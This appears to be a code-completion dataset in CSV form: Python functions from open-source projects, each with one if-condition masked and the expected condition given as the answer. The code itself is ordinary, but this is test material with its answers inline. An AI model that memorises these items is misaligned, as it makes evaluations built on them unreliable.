2520,"def safe_makedir(dname):<tab>""""""Make a directory if it doesn't exist, handling concurrent race conditions.""""""<tab>if not dname:<tab><tab>return dname<tab>num_tries = 0<tab>max_tries = 5<tab>while not os.path.exists(dname):<tab><tab># we could get an error here if multiple processes are creating<tab><tab># the directory at the same time. Grr, concurrency.<tab><tab>try:<tab><tab><tab>os.makedirs(dname)<tab><tab>except OSError:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise<tab><tab><tab>num_tries += 1<tab><tab><tab>time.sleep(2)<tab>return dname",if num_tries > max_tries :,164
2521,"def _setup_data(self, path):<tab>with PathManager.open(path) as data_file:<tab><tab><IF-STMT><tab><tab><tab>line = data_file.readline()<tab><tab><tab># trim corrupted JSON<tab><tab><tab>line = line[: line.rfind(""{"")]<tab><tab><tab>line = line[: line.rfind("","")] + ""]""<tab><tab><tab>self.data = json.loads(line)<tab><tab>else:<tab><tab><tab>self.data = json.load(data_file)","if ""extra"" in path and ""train"" in path :",124
2522,"def _end_delimiter(state, token):<tab>py = state[""pymode""]<tab>s = token.string<tab>l, c = token.start<tab>if len(py) > 1:<tab><tab>mode, orig, match, pos = py.pop()<tab><tab><IF-STMT><tab><tab><tab>e = '""{}"" at {} ends ""{}"" at {} (expected ""{}"")'<tab><tab><tab>return e.format(s, (l, c), orig, pos, match)<tab>else:<tab><tab>return 'Unmatched ""{}"" at line {}, column {}'.format(s, l, c)",if s != match :,132
2523,"def onLeftDoubleClick(self, event):<tab>row, _ = self.HitTest(event.Position)<tab>if row != -1:<tab><tab>col = self.getColumn(event.Position)<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>booster = self.boosters[row]<tab><tab><tab>except IndexError:<tab><tab><tab><tab>return<tab><tab><tab>self.removeBoosters([booster])",if col != self . getColIndex ( State ) :,107
2524,"def get_instance_userdata(<tab>version=""latest"",<tab>sep=None,<tab>url=""http://169.254.169.254"",<tab>timeout=None,<tab>num_retries=5,):<tab>ud_url = _build_instance_metadata_url(url, version, ""user-data"")<tab>user_data = retry_url(<tab><tab>ud_url, retry_on_404=False, num_retries=num_retries, timeout=timeout<tab>)<tab>if user_data:<tab><tab><IF-STMT><tab><tab><tab>l = user_data.split(sep)<tab><tab><tab>user_data = {}<tab><tab><tab>for nvpair in l:<tab><tab><tab><tab>t = nvpair.split(""="")<tab><tab><tab><tab>user_data[t[0].strip()] = t[1].strip()<tab>return user_data",if sep :,198
2525,def parts(self):<tab>klass = self.__class__<tab>this = list()<tab>for token in self:<tab><tab>if token.startswith_fws():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>yield this[0] if len(this) == 1 else klass(this)<tab><tab><tab><tab>this.clear()<tab><tab>end_ws = token.pop_trailing_ws()<tab><tab>this.append(token)<tab><tab>if end_ws:<tab><tab><tab>yield klass(this)<tab><tab><tab>this = [end_ws]<tab>if this:<tab><tab>yield this[0] if len(this) == 1 else klass(this),if this :,153
2526,"def run(self):<tab>while True:<tab><tab>self._trigger.wait()<tab><tab>self._trigger.clear()<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>for url in self.urls:<tab><tab><tab>logger.info(""Pinging for problem update: %s"", url)<tab><tab><tab>try:<tab><tab><tab><tab>with closing(urlopen(url, data="""")) as f:<tab><tab><tab><tab><tab>f.read()<tab><tab><tab>except Exception:<tab><tab><tab><tab>logger.exception(""Failed to ping for problem update: %s"", url)",if self . _terminate :,132
2527,"def _get_trading_minutes(self, trading_date):<tab>trading_minutes = set()<tab>for account_type in self._config.base.accounts:<tab><tab>if account_type == DEFAULT_ACCOUNT_TYPE.STOCK:<tab><tab><tab>trading_minutes = trading_minutes.union(<tab><tab><tab><tab>self._get_stock_trading_minutes(trading_date)<tab><tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>trading_minutes = trading_minutes.union(<tab><tab><tab><tab>self._get_future_trading_minutes(trading_date)<tab><tab><tab>)<tab>return sorted(list(trading_minutes))",elif account_type == DEFAULT_ACCOUNT_TYPE . FUTURE :,169
2528,"def make_tree(self, node):<tab>if node is self.root:<tab><tab>node.code = """"<tab>children = []<tab>for bit in ""01"":<tab><tab>next_code = node.code + bit<tab><tab><IF-STMT><tab><tab><tab>child = Node(char=self.codes[next_code])<tab><tab>else:<tab><tab><tab>child = Node()<tab><tab>child.code = next_code<tab><tab>children.append(child)<tab>node.add(children)<tab>for child in children:<tab><tab>if not child.is_leaf:<tab><tab><tab>self.make_tree(child)",if next_code in self . codes :,152
2529,"def _merge(self, a, b, path=None):<tab>""""""Merge two dictionaries, from http://stackoverflow.com/questions/7204805/dictionaries-of-dictionaries-merge""""""<tab>if path is None:<tab><tab>path = []<tab>for key in b:<tab><tab>if key in a:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._merge(a[key], b[key], path + [str(key)])<tab><tab><tab>elif a[key] == b[key]:<tab><tab><tab><tab>pass  # same leaf value<tab><tab><tab>else:<tab><tab><tab><tab>raise Exception(""Conflict at %s"" % ""."".join(path + [str(key)]))<tab><tab>else:<tab><tab><tab>a[key] = b[key]<tab>return a","if isinstance ( a [ key ] , dict ) and isinstance ( b [ key ] , dict ) :",196
2530,"def _append_value(generator, val=None):<tab>for example in generator:<tab><tab>example = list(example)<tab><tab><IF-STMT><tab><tab><tab>for key, value in val.items():<tab><tab><tab><tab>example[key] = np.append(example[key], value, -1)<tab><tab>yield tuple(example)",if val is not None :,82
2531,"def run(self):<tab>to_delete = set()<tab>for k, v in iteritems(self.objs):<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if v[""_class""] == ""SubmissionFormatElement"":<tab><tab><tab>to_delete.add(k)<tab><tab>if v[""_class""] == ""Task"":<tab><tab><tab>v[""submission_format""] = list(<tab><tab><tab><tab>self.objs[k][""filename""] for k in v.get(""submission_format"", list())<tab><tab><tab>)<tab>for k in to_delete:<tab><tab>del self.objs[k]<tab>return self.objs","if k . startswith ( ""_"" ) :",147
2532,"def service_destroy(context, service_id):<tab>session = get_session()<tab>with session.begin():<tab><tab>service_ref = service_get(context, service_id, session=session)<tab><tab>service_ref.delete(session=session)<tab><tab><IF-STMT><tab><tab><tab>for c in service_ref.compute_node:<tab><tab><tab><tab>c.delete(session=session)","if service_ref . topic == ""compute"" and service_ref . compute_node :",111
2533,"def wiki(self, query):<tab>res = []<tab>for entry in g.current_wiki.get_index():<tab><tab>name = filename_to_cname(entry[""name""])<tab><tab>name = re.sub(r""//+"", ""/"", name)<tab><tab><IF-STMT><tab><tab><tab>page = g.current_wiki.get_page(name)<tab><tab><tab># this can be None, not sure how<tab><tab><tab>if page:<tab><tab><tab><tab>res.append(dict(name=name, content=page.data))<tab>return res","if set ( query . split ( ) ) . intersection ( name . replace ( ""/"" , ""-"" ) . split ( ""-"" ) ) :",143
2534,"def numericalize(self, arr, device=None):<tab>if isinstance(arr[0][0], list):<tab><tab>tmp = [<tab><tab><tab>super(BABI20Field, self).numericalize(x, device=device).data for x in arr<tab><tab>]<tab><tab>arr = torch.stack(tmp)<tab><tab><IF-STMT><tab><tab><tab>arr = arr.contiguous()<tab><tab>return arr<tab>else:<tab><tab>return super(BABI20Field, self).numericalize(arr, device=device)",if self . sequential :,127
2535,def validate_and_handle(self):<tab>valid = self.validate(set_cursor=True)<tab>if valid:<tab><tab>if self.accept_handler:<tab><tab><tab>keep_text = self.accept_handler(self)<tab><tab>else:<tab><tab><tab>keep_text = False<tab><tab><IF-STMT><tab><tab><tab>self.reset(),if not keep_text :,86
2536,"def headerData(self, section, orientation, role=Qt.DisplayRole):<tab>if role == Qt.TextAlignmentRole:<tab><tab>if orientation == Qt.Horizontal:<tab><tab><tab>return to_qvariant(int(Qt.AlignHCenter | Qt.AlignVCenter))<tab><tab>return to_qvariant(int(Qt.AlignRight | Qt.AlignVCenter))<tab>if role != Qt.DisplayRole:<tab><tab>return to_qvariant()<tab>if orientation == Qt.Horizontal:<tab><tab><IF-STMT><tab><tab><tab>return to_qvariant(""Name"")<tab><tab>elif section == VERSION:<tab><tab><tab>return to_qvariant(""Version"")<tab><tab>elif section == ACTION:<tab><tab><tab>return to_qvariant(""Action"")<tab><tab>elif section == DESCRIPTION:<tab><tab><tab>return to_qvariant(""Description"")<tab>return to_qvariant()",if section == NAME :,192
2537,"def replace(self, state):<tab>if state.key in self._dict:<tab><tab>try:<tab><tab><tab>existing = self._dict[state.key]<tab><tab>except KeyError:<tab><tab><tab># catch gc removed the key after we just checked for it<tab><tab><tab>pass<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._manage_removed_state(existing)<tab><tab><tab>else:<tab><tab><tab><tab>return<tab>self._dict[state.key] = state<tab>self._manage_incoming_state(state)",if existing is not state :,131
2538,"def _line_generator(fh, skip_blanks=False, strip=True):<tab>for line in fh:<tab><tab><IF-STMT><tab><tab><tab>line = line.strip()<tab><tab>skip = False<tab><tab>if skip_blanks:<tab><tab><tab>skip = line.isspace() or not line<tab><tab>if not skip:<tab><tab><tab>yield line",if strip :,82
2539,"def _get_workers_with_max_size(worker_to_size):<tab>""""""Get workers with maximal size""""""<tab>max_workers = set()<tab>max_size = 0<tab>for w, size in worker_to_size.items():<tab><tab><IF-STMT><tab><tab><tab>max_size = size<tab><tab><tab>max_workers = {w}<tab><tab>elif size == max_size:<tab><tab><tab>max_workers.add(w)<tab>max_workers.difference_update([None])<tab>return max_size, list(max_workers)",if size > max_size :,135
2540,"def parse(self):<tab>while 1:<tab><tab>l = self.f.readline()<tab><tab>if not l:<tab><tab><tab>return<tab><tab>l = l.strip()<tab><tab>if l.startswith(""[""):<tab><tab><tab>self.parse_uuid(l)<tab><tab>elif l.startswith(""interface"") or l.startswith(""dispinterface""):<tab><tab><tab>self.parse_interface(l)<tab><tab><IF-STMT><tab><tab><tab>self.parse_coclass(l)","elif l . startswith ( ""coclass"" ) :",117
2541,"def check_source_unit(self, source, unit):<tab>""""""Check source string.""""""<tab>rules = [FLAG_RULES[flag] for flag in unit.all_flags if flag in FLAG_RULES]<tab>if not rules:<tab><tab>return False<tab>found = set()<tab>for regexp, is_position_based in rules:<tab><tab>for match in regexp.finditer(source[0]):<tab><tab><tab>if is_position_based(match[1]):<tab><tab><tab><tab>found.add((match.start(0), match.end(0)))<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>return True<tab>return False",if len ( found ) >= 2 :,156
2542,"def parse_exprlist(self):<tab>list = []<tab>while TRUE:<tab><tab>self.reader.skip_white()<tab><tab>c = self.reader.peek()<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>node = self.parse_expr()<tab><tab>viml_add(list, node)<tab>return list","if c != '""' and self . ends_excmds ( c ) :",90
2543,"def can_see_ban_details(request, profile):<tab>if request.user.is_authenticated:<tab><tab><IF-STMT><tab><tab><tab>from .bans import get_user_ban<tab><tab><tab>return bool(get_user_ban(profile, request.cache_versions))<tab><tab>return False<tab>return False","if request . user_acl [ ""can_see_ban_details"" ] :",87
2544,"def mouse_move(self, ips, x, y, btn, **key):<tab>if ips.roi == None:<tab><tab>return<tab>lim = 5.0 / key[""canvas""].get_scale()<tab>if btn == None:<tab><tab>self.cursor = wx.CURSOR_CROSS<tab><tab><IF-STMT><tab><tab><tab>self.cursor = wx.CURSOR_HAND<tab>elif btn == 1:<tab><tab>if self.curobj:<tab><tab><tab>ips.roi.draged(self.odx, self.ody, x, y, ips.cur, self.curobj)<tab><tab>ips.update()<tab>self.odx, self.ody = x, y","if ips . roi . snap ( x , y , ips . cur , lim ) != None :",178
2545,"def evex_mask_dest_reg_only(ii):  # optional imm8<tab>i, m, xyz = 0, 0, 0<tab>for op in _gen_opnds(ii):<tab><tab>if op_mask_reg(op):<tab><tab><tab>m += 1<tab><tab><IF-STMT><tab><tab><tab>xyz += 1<tab><tab>elif op_imm8(op):<tab><tab><tab>i += 1<tab><tab>else:<tab><tab><tab>return False<tab>return m == 1 and xyz > 0 and i <= 1",elif op_xmm ( op ) or op_ymm ( op ) or op_zmm ( op ) :,143
2546,"def encode_datetime(self, dt, state):<tab>fmt = self.options.datetime_format<tab>is_iso = not fmt or fmt == ""iso""<tab>if is_iso:<tab><tab><IF-STMT><tab><tab><tab>fmt = ""%Y-%m-%dT%H:%M:%S%z""<tab><tab>else:<tab><tab><tab>fmt = ""%Y-%m-%dT%H:%M:%S.%f%z""<tab>s = dt.strftime(fmt)<tab>if is_iso and s.endswith(""-00:00"") or s.endswith(""+00:00""):<tab><tab>s = s[:-6] + ""Z""  # Change UTC to use 'Z' notation<tab>self.encode_string(s, state)",if dt . microsecond == 0 :,172
2547,"def main(config):<tab>with PathManager.open(config[""infile""], ""r"") as fin, PathManager.open(<tab><tab>config[""outfile""], ""w""<tab>) as fout:<tab><tab>for line in fin.readlines():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>first_space = line.index("" "")<tab><tab><tab>first_tab = line.index(""\t"")<tab><tab><tab>candidate = line[first_space + 1 : first_tab]<tab><tab><tab>fout.write(candidate + ""\n"")","if ""persona"" in line :",133
2548,"def compact_repr(record):<tab>parts = []<tab>for key in record.__attributes__:<tab><tab>value = getattr(record, key)<tab><tab>if not value:<tab><tab><tab>continue<tab><tab>if isinstance(value, list):<tab><tab><tab>value = HIDE_LIST<tab><tab><IF-STMT><tab><tab><tab>value = format_feats(value)<tab><tab>else:<tab><tab><tab>value = repr(value)<tab><tab>value = capped_str(value)<tab><tab>parts.append(""%s=%s"" % (key, value))<tab>return ""%s(%s)"" % (record.__class__.__name__, "", "".join(parts))",elif key == FEATS :,152
2549,"def make_chain(word):<tab>which = 1<tab>while True:<tab><tab>songs = find_songs_that_start_with_word(word)<tab><tab><IF-STMT><tab><tab><tab>song = random.choice(songs)<tab><tab><tab>print(which, song[""name""] + "" by "" + song[""artists""][0][""name""])<tab><tab><tab>which += 1<tab><tab><tab>word = song[""name""].lower().split()[-1]<tab><tab>else:<tab><tab><tab>break",if len ( songs ) > 0 :,118
2550,"def set_break(self, filename, lineno, temporary=False, cond=None, funcname=None):<tab>if isinstance(funcname, str):<tab><tab><IF-STMT><tab><tab><tab>globals_ = globals()<tab><tab>else:<tab><tab><tab>module = importlib.import_module(filename[:-3])<tab><tab><tab>globals_ = module.__dict__<tab><tab>func = eval(funcname, globals_)<tab><tab>code = func.__code__<tab><tab>filename = code.co_filename<tab><tab>lineno = code.co_firstlineno<tab><tab>funcname = code.co_name<tab>res = super(Bdb, self).set_break(<tab><tab>filename, lineno, temporary=temporary, cond=cond, funcname=funcname<tab>)<tab>if isinstance(res, str):<tab><tab>raise BdbError(res)<tab>return res",if filename == __file__ :,192
2551,"def __init__(self, shapefile=None, shapeType=POINT, autoBalance=1):<tab>self.autoBalance = autoBalance<tab>if not shapefile:<tab><tab>Writer.__init__(self, shapeType)<tab>elif is_string(shapefile):<tab><tab>base = os.path.splitext(shapefile)[0]<tab><tab><IF-STMT><tab><tab><tab>r = Reader(base)<tab><tab><tab>Writer.__init__(self, r.shapeType)<tab><tab><tab>self._shapes = r.shapes()<tab><tab><tab>self.fields = r.fields<tab><tab><tab>self.records = r.records()","if os . path . isfile ( ""%s.shp"" % base ) :",157
2552,"def test_env_not_set(self):<tab>with mock.patch.dict(""os.environ""):<tab><tab><IF-STMT><tab><tab><tab>del os.environ[self.env_name]<tab><tab>self.assertEqual(helper.get_xdg_env(self.env_name, self.default), self.default)",if self . env_name in os . environ :,83
2553,"def selection_only(self):<tab>selection_only = False<tab>sel = self.sel()<tab>if (self.context == ""selection"" or self.context == ""both"") and len(sel):<tab><tab># if multiple lines, always true<tab><tab>if len(sel) > 1:<tab><tab><tab>selection_only = True<tab><tab># check threshold<tab><tab>elif self.threshold and not sel[0].empty():<tab><tab><tab>text = self.view.substr(sel[0])<tab><tab><tab>match = re.search(self.threshold, text)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>selection_only = True<tab><tab># no valid selection<tab><tab>else:<tab><tab><tab>selection_only = False<tab>return selection_only",if match :,174
2554,"def __call__(self, rule, param):<tab>p, g = param.data, param.grad<tab>if p is None or g is None:<tab><tab>return<tab>with chainer.using_device(param.device):<tab><tab>xp = param.device.xp<tab><tab>sign = xp.sign(p)<tab><tab><IF-STMT><tab><tab><tab>kernel = cuda.elementwise(""T s, T decay"", ""T g"", ""g += decay * s"", ""lasso"")<tab><tab><tab>kernel(sign, self.rate, g)<tab><tab>else:<tab><tab><tab>g += self.rate * sign",if xp is cuda . cupy :,144
2555,"def map_packages(shutit_pexpect_session, package_str, install_type):<tab>res = """"<tab>for package in package_str.split():<tab><tab>map_package_res = map_package(shutit_pexpect_session, package, install_type)<tab><tab><IF-STMT><tab><tab><tab>return res<tab><tab>res += "" "" + map_package_res<tab>return res","if map_package_res == """" :",101
2556,"def get_opnd_types_short(ii):<tab>types = []<tab>for op in _gen_opnds(ii):<tab><tab>if op.oc2:<tab><tab><tab>types.append(op.oc2)<tab><tab>elif op_luf_start(op, ""GPRv""):<tab><tab><tab>types.append(""v"")<tab><tab>elif op_luf_start(op, ""GPRz""):<tab><tab><tab>types.append(""z"")<tab><tab><IF-STMT><tab><tab><tab>types.append(""y"")<tab><tab>else:<tab><tab><tab>die(""Unhandled op type {}"".format(op))<tab>return types","elif op_luf_start ( op , ""GPRy"" ) :",161
2557,"def _process_archive(self, archive_stream, subtitle):<tab>for file_name in archive_stream.namelist():<tab><tab><IF-STMT><tab><tab><tab>logger.info(""Found subtitle file %r"", file_name)<tab><tab><tab>subtitle.content = fix_line_ending(archive_stream.read(file_name))<tab><tab><tab>if subtitle.is_valid():<tab><tab><tab><tab>return","if file_name . lower ( ) . endswith ( ( "".srt"" , "".sub"" ) ) :",105
2558,"def truncate(self, size=None):<tab># type: (Optional[int]) -> int<tab># Inefficient, but I don't know if truncate is possible with ftp<tab>with self._lock:<tab><tab>if size is None:<tab><tab><tab>size = self.tell()<tab><tab>with self.fs.openbin(self.path) as f:<tab><tab><tab>data = f.read(size)<tab><tab>with self.fs.openbin(self.path, ""w"") as f:<tab><tab><tab>f.write(data)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>f.write(b""\0"" * (size - len(data)))<tab>return size",if len ( data ) < size :,163
2559,def wakeup(self):<tab>try:<tab><tab><IF-STMT><tab><tab><tab>self.wm_withdraw()<tab><tab><tab>self.wm_deiconify()<tab><tab>self.tkraise()<tab><tab>self.focused_widget.focus_set()<tab>except TclError:<tab><tab># This can happen when the window menu was torn off.<tab><tab># Simply ignore it.<tab><tab>pass,"if self . wm_state ( ) == ""iconic"" :",109
2560,"def locus_parser(self):<tab>line = self.stream.readline()<tab>while line != """":<tab><tab>line = line.rstrip()<tab><tab>match = re.match("" Locus: (.+)"", line)<tab><tab><IF-STMT><tab><tab><tab>locus = match.group(1)<tab><tab><tab>alleles, table = _read_allele_freq_table(self.stream)<tab><tab><tab>return locus, alleles, table<tab><tab>line = self.stream.readline()<tab>self.done = True<tab>raise StopIteration",if match is not None :,131
2561,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab>if tt == 10:<tab><tab><tab>self.set_content(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 18:<tab><tab><tab>self.set_blob_key(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 24:<tab><tab><tab>self.set_width(d.getVarInt32())<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>self.set_height(d.getVarInt32())<tab><tab><tab>continue<tab><tab>if tt == 0:<tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 32 :,182
2562,"def concat_kernel_sources(self):<tab>func_sources = OrderedDict()<tab>for kernel in self.kernels:<tab><tab>for func_name, source in kernel.func_sources.items():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>assert func_sources[func_name] == source<tab><tab><tab>else:<tab><tab><tab><tab>func_sources[func_name] = source<tab>self.generate_top_source()<tab>self.generate_exec_source()<tab>self.generate_init_source()<tab>combined_source = (<tab><tab>"""".join(self.header_sources.values())<tab><tab>+ ""\n"".join(func_sources.values())<tab><tab>+ """".join(self.footer_sources.values())<tab>)<tab>return combined_source",if func_name in func_sources :,185
2563,"def parseUnderindentTag(self, s):<tab>tag = self.underindentEscapeString<tab>s2 = s[len(tag) :]<tab># To be valid, the escape must be followed by at least one digit.<tab>i = 0<tab>while i < len(s2) and s2[i].isdigit():<tab><tab>i += 1<tab>if i > 0:<tab><tab>n = int(s2[:i])<tab><tab># Bug fix: 2012/06/05: remove any period following the count.<tab><tab># This is a new convention.<tab><tab><IF-STMT><tab><tab><tab>i += 1<tab><tab>return n, s2[i:]<tab>else:<tab><tab>return 0, s","if i < len ( s2 ) and s2 [ i ] == ""."" :",178
2564,"def load(self, data):<tab>ckey = None<tab>for key, val in _rx_cookie.findall(data):<tab><tab>if key.lower() in _c_keys:<tab><tab><tab>if ckey:<tab><tab><tab><tab>self[ckey][key] = _unquote(val)<tab><tab><IF-STMT><tab><tab><tab># RFC2109: NAMEs that begin with $ are reserved for other uses<tab><tab><tab># and must not be used by applications.<tab><tab><tab>continue<tab><tab>else:<tab><tab><tab>self[key] = _unquote(val)<tab><tab><tab>ckey = key","elif key [ 0 ] == ""$"" :",143
2565,"def load_cases(full_path):<tab>all_test_data = json.load(open(full_path), object_pairs_hook=OrderedDict)<tab>for test_data in all_test_data:<tab><tab>given = test_data[""given""]<tab><tab>for case in test_data[""cases""]:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>test_type = ""result""<tab><tab><tab>elif ""error"" in case:<tab><tab><tab><tab>test_type = ""error""<tab><tab><tab>elif ""bench"" in case:<tab><tab><tab><tab>test_type = ""bench""<tab><tab><tab>else:<tab><tab><tab><tab>raise RuntimeError(""Unknown test type: %s"" % json.dumps(case))<tab><tab><tab>yield (given, test_type, case)","if ""result"" in case :",183
2566,"def delete(self):<tab>if not self.force and not self.exists():<tab><tab>return []<tab>cmd = [""delete""]<tab>if self.filename:<tab><tab>cmd.append(""--filename="" + self.filename)<tab>else:<tab><tab><IF-STMT><tab><tab><tab>self.module.fail_json(msg=""resource required to delete without filename"")<tab><tab>cmd.append(self.resource)<tab><tab>if self.name:<tab><tab><tab>cmd.append(self.name)<tab><tab>if self.label:<tab><tab><tab>cmd.append(""--selector="" + self.label)<tab><tab>if self.all:<tab><tab><tab>cmd.append(""--all"")<tab><tab>if self.force:<tab><tab><tab>cmd.append(""--ignore-not-found"")<tab>return self._execute(cmd)",if not self . resource :,189
2567,"def validate_latex_theme_options(app: Sphinx, config: Config) -> None:<tab>for key in list(config.latex_theme_options):<tab><tab><IF-STMT><tab><tab><tab>msg = __(""Unknown theme option: latex_theme_options[%r], ignored."")<tab><tab><tab>logger.warning(msg % (key,))<tab><tab><tab>config.latex_theme_options.pop(key)",if key not in Theme . UPDATABLE_KEYS :,103
2568,"def connectionLost(self, reason):<tab><IF-STMT><tab><tab>self.log.info(<tab><tab><tab>""WampRawSocketProtocol: connection lost: reason = '{0}'"".format(reason)<tab><tab>)<tab>try:<tab><tab>wasClean = isinstance(reason.value, ConnectionDone)<tab><tab>self._session.onClose(wasClean)<tab>except Exception as e:<tab><tab># silently ignore exceptions raised here ..<tab><tab>if self.factory.debug:<tab><tab><tab>self.log.info(<tab><tab><tab><tab>""WampRawSocketProtocol: ApplicationSession.onClose raised ({0})"".format(<tab><tab><tab><tab><tab>e<tab><tab><tab><tab>)<tab><tab><tab>)<tab>self._session = None",if self . factory . debug :,172
2569,"def parse(filename):<tab>dead_links = []<tab>with open(filename, ""r"") as file_:<tab><tab>for line in file_.readlines():<tab><tab><tab>res = reference_line.search(line)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if not exists(res.group(1)):<tab><tab><tab><tab><tab>dead_links.append(res.group(1))<tab>return dead_links",if res :,96
2570,"def is_speaker_at_session(self, session_id):<tab>try:<tab><tab>session = (<tab><tab><tab>Session.query.filter(Session.speakers.any(Speaker.user_id == self.id))<tab><tab><tab>.filter(Session.id == session_id)<tab><tab><tab>.one()<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>return True<tab><tab>else:<tab><tab><tab>return False<tab>except MultipleResultsFound:<tab><tab>return False<tab>except NoResultFound:<tab><tab>return False",if session :,123
2571,"def _validate_deployment_name(namespace):<tab># If missing,try come out with a name associated with the template name<tab>if namespace.deployment_name is None:<tab><tab>template_filename = None<tab><tab><IF-STMT><tab><tab><tab>template_filename = namespace.template_file<tab><tab>if namespace.template_uri and urlparse(namespace.template_uri).scheme:<tab><tab><tab>template_filename = urlsplit(namespace.template_uri).path<tab><tab>if template_filename:<tab><tab><tab>template_filename = os.path.basename(template_filename)<tab><tab><tab>namespace.deployment_name = os.path.splitext(template_filename)[0]<tab><tab>else:<tab><tab><tab>namespace.deployment_name = ""deployment1""",if namespace . template_file and os . path . isfile ( namespace . template_file ) :,186
2572,"def mro(cls):<tab>if self.ready:<tab><tab>if cls.__name__ == ""B1"":<tab><tab><tab>B2.__bases__ = (B1,)<tab><tab><IF-STMT><tab><tab><tab>B1.__bases__ = (B2,)<tab>return type.mro(cls)","if cls . __name__ == ""B2"" :",76
2573,"def mark_shard_complete():<tab>try:<tab><tab>marker.refresh_from_db()<tab>except DeferIterationMarker.DoesNotExist:<tab><tab>logger.warning(<tab><tab><tab>""TaskMarker with ID: %s has vanished, cancelling task"", marker_id<tab><tab>)<tab><tab>return<tab>marker.shards_complete += 1<tab>marker.save()<tab>if marker.shards_complete == marker.shard_count:<tab><tab># Delete the marker if we were asked to<tab><tab><IF-STMT><tab><tab><tab>marker.delete()<tab><tab>defer(finalize, *args, _transactional=True, _queue=task_queue_name(), **kwargs)",if marker . delete_on_completion :,160
2574,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab>if tt == 10:<tab><tab><tab>length = d.getVarInt32()<tab><tab><tab>tmp = ProtocolBuffer.Decoder(d.buffer(), d.pos(), d.pos() + length)<tab><tab><tab>d.skip(length)<tab><tab><tab>self.add_public_certificate_list().TryMerge(tmp)<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>self.set_max_client_cache_time_in_second(d.getVarInt64())<tab><tab><tab>continue<tab><tab>if tt == 0:<tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 16 :,181
2575,"def check_free(self, payload):<tab># free_list: 'host=10.0.0.1', 'user=anonymous', 'host=10.0.0.7,user=test', ...<tab>for m in self.free_list:<tab><tab>args = m.split("","", 1)<tab><tab>for arg in args:<tab><tab><tab>k, v = arg.split(""="", 1)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab>else:<tab><tab><tab>return True<tab>return False",if payload [ k ] != v :,126
2576,"def getInnerText(element):<tab># To mimic IE's 'innerText' property in the W3C DOM, we need to recursively<tab># concatenate all child text nodes (depth first).<tab>text = """"<tab>child = element.firstChild<tab>while child:<tab><tab><IF-STMT><tab><tab><tab>text += getInnerText(child)<tab><tab>elif child.nodeValue:<tab><tab><tab>text += child.nodeValue<tab><tab>child = child.nextSibling<tab>return text",if child . nodeType == 1 :,119
2577,"def get_complete_http(self):<tab>finished = []<tab>c = self.connection.cursor()<tab>rows = c.execute(""SELECT * FROM http WHERE complete=1"").fetchall()<tab>for row in rows:<tab><tab>o = pickle.loads(row[""object""])<tab><tab>uadat = c.execute(""SELECT * FROM ua WHERE parent_id=?"", (o.id,)).fetchall()<tab><tab>for ua in uadat:<tab><tab><tab>uao = pickle.loads(ua[""object""])<tab><tab><tab><IF-STMT><tab><tab><tab><tab>o.add_ua_data(uao)<tab><tab>finished.append(o)<tab>c.close()<tab>return finished",if uao is not None and uao . source_code is not None and o . source_code :,178
2578,"def get_tools(self, found_files):<tab>self.configured_by = {}<tab>runners = []<tab>for tool_name in self.tools_to_run:<tab><tab>tool = tools.TOOLS[tool_name]()<tab><tab>config_result = tool.configure(self, found_files)<tab><tab>if config_result is None:<tab><tab><tab>configured_by = None<tab><tab><tab>messages = []<tab><tab>else:<tab><tab><tab>configured_by, messages = config_result<tab><tab><tab><IF-STMT><tab><tab><tab><tab>messages = []<tab><tab>self.configured_by[tool_name] = configured_by<tab><tab>self.messages += messages<tab><tab>runners.append(tool)<tab>return runners",if messages is None :,172
2579,"def _yield_batches(self, keys):<tab>while self._shuffling_buffer.can_retrieve():<tab><tab>post_shuffled_row = self._shuffling_buffer.retrieve()<tab><tab>if not isinstance(post_shuffled_row, dict):<tab><tab><tab># This is for the case of batched reads. Here we restore back the<tab><tab><tab># dictionary format of records<tab><tab><tab>post_shuffled_row = dict(zip(keys, post_shuffled_row))<tab><tab>self._batch_acc.append(post_shuffled_row)<tab><tab># Batch is ready? Collate and emmit<tab><tab><IF-STMT><tab><tab><tab>yield self.collate_fn(self._batch_acc)<tab><tab><tab>self._batch_acc = []",if len ( self . _batch_acc ) == self . batch_size :,187
2580,"def action_open_file_filtered_dialog(self, widget):<tab>try:<tab><tab>fname = self.main_window.open_file_dialog(<tab><tab><tab>title=""Open file with Toga"",<tab><tab><tab>multiselect=False,<tab><tab><tab>file_types=[""doc"", ""txt""],<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>self.label.text = ""File to open:"" + fname<tab><tab>else:<tab><tab><tab>self.label.text = ""No file selected!""<tab>except ValueError:<tab><tab>self.label.text = ""Open file dialog was canceled""",if fname is not None :,143
